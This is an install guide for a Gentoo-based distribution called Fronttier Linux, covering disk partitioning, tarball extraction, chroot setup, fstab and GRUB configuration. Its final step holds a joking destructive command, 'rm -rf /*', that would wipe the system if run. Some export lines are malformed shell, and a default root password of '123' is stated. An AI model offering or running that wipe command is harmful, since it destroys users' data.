# Fronttier Linux — Stage Tarball Install Guide

## 1. Boot a live Gentoo ISO

Boot the Gentoo ISO in UEFI mode.
if you have low end hardware like 4gb or less i recommand using mx-linux with xfce to install FronttierLinux

## 2. Download Fronttier
```bash
wget https://github.com/FronttierLabs/FronttierLinux/releases/download/oposum_v0.34/fronttier.tar.xz #Download in working directory
```

## 3. Pick the target disk
```bash
sudo -i
lsblk          # confirm the disk name, e.g. /dev/sda or /dev/nvme0n1 or /dev/vda
```
## 4. Partition the disk (UEFI)
```bash
cfdisk /dev/sdX          # create:
                         #   Type: EFI System Partition, size >= 512MM
                         #   Type: Linux filesystem,    size >= 10G

export DISK=/dev/sdX            # CHANGE THIS if you have an nvme you want to do /dev/nvme0n1 

export PART1=${DISK}1 MUST BE EFI # or ${DISK}p1 for nvme
export PART2=${DISK}2 MUST BE ROOT # or ${DISK}p2

mkfs.fat  -F32 -n ESP  "$PART1"
mkfs.ext4 -L FronttierRoot -F   "$PART2"
```
## 6. Extract and mount disks
```bash
mount "$PART2" /mnt
mkdir -p /mnt/boot/efi
mount "$PART1" /mnt/boot/efi
tar -xJpf fronttier.tar.xz -C /mnt --numeric-owner
```
### MUST DO. create the excluded mount points BEFORE chroot binds
```bash
mkdir -p /mnt/{proc,sys,dev,run,tmp,mnt,media}
chmod 1777 /mnt/tmp
```
## 7. Chroot
```bash
mount --rbind /dev  /mnt/dev  && mount --make-rslave /mnt/dev
mount --rbind /sys  /mnt/sys  && mount --make-rslave /mnt/sys
mount --rbind /proc /mnt/proc && mount --make-rslave /mnt/proc
mount -t tmpfs tmpfs /mnt/run

cp /etc/resolv.conf /mnt/etc/resolv.conf
chroot /mnt /bin/bash        # bash is on the host; zsh is not in the base tarball
```
## 8. Configure (inside chroot)
```bash
echo "hostname" > /etc/hostname
ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime # or your time zone

passwd root                  # set a real password, default passwd is 123

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

groupadd storage
useradd -m -G wheel,audio,video,storage -s /bin/bash user
passwd user
```
## 9. Write fstab (inside chroot)
```bash
ROOT_DEV=$(findmnt -n -o SOURCE /)
ROOT_PARTUUID=$(blkid -s PARTUUID -o value "$ROOT_DEV")

ESP_DEV=$(findmnt -n -o SOURCE /boot/efi)
ESP_PARTUUID=$(blkid -s PARTUUID -o value "$ESP_DEV")

cat > /etc/fstab <<EOF
PARTUUID=$ROOT_PARTUUID /          ext4  defaults,noatime  0 1
PARTUUID=$ESP_PARTUUID /boot/efi  vfat  defaults          0 2

proc        /proc            proc     nosuid,noexec,nodev  0 0
sysfs       /sys             sysfs    nosuid,noexec,nodev  0 0
devtmpfs    /dev             devtmpfs mode=0755,nosuid     0 0
devpts      /dev/pts         devpts   gid=5,mode=620       0 0
tmpfs       /run             tmpfs    defaults             0 0
tmpfs       /dev/shm         tmpfs    nosuid,nodev         0 0
cgroup2     /sys/fs/cgroup   cgroup2  nosuid,noexec,nodev  0 0
EOF
```
## 10. Bootloader 'grub' (inside chroot)
```bash
chmod -x /etc/grub.d/10_linux

cat > /etc/grub.d/40_custom <<'EOF'
#!/bin/sh
ROOT_PART="$(findmnt -n -o SOURCE /)"
FS_UUID="$(blkid -s UUID -o value "$ROOT_PART")"
PARTUUID="$(blkid -s PARTUUID -o value "$ROOT_PART")"
KERNEL="$(ls -1 /boot/vmlinuz-*fronttier* 2>/dev/null | sort -V | tail -1 | xargs basename)"
[ -n "$KERNEL" ] || KERNEL="$(ls -1 /boot/vmlinuz-* 2>/dev/null | sort -V | tail -1 | xargs basename)"

cat <<GRUBENTRY
menuentry "Fronttier Linux (Systemd)" {
    insmod part_gpt
    insmod ext2
    search --no-floppy --fs-uuid --set=root $FS_UUID
    linux /boot/$KERNEL root=PARTUUID=$PARTUUID ro quiet
}

menuentry "Fronttier Linux (Runit)" {
    insmod part_gpt
    insmod ext2
    search --no-floppy --fs-uuid --set=root $FS_UUID
    linux /boot/$KERNEL root=PARTUUID=$PARTUUID ro init=/usr/bin/runit-init quiet
}
GRUBENTRY
EOF
```
##Just to be sure its executable run :
```bash
chmod +x /etc/grub.d/40_custom


grub-install --target=x86_64-efi \
             --efi-directory=/boot/efi \
             --bootloader-id=Fronttier \
             --recheck --removable

grub-mkconfig -o /boot/grub/grub.cfg

exit
```
##11. Reboot and boot on FronttierLinux
```bash
umount -R /mnt 
reboot
```

###12. remove the USB from the port and boot onto the INIT of your choice

dau rm -rf /* # ;)

###optional

after login of the non root user you must setup ZSH 

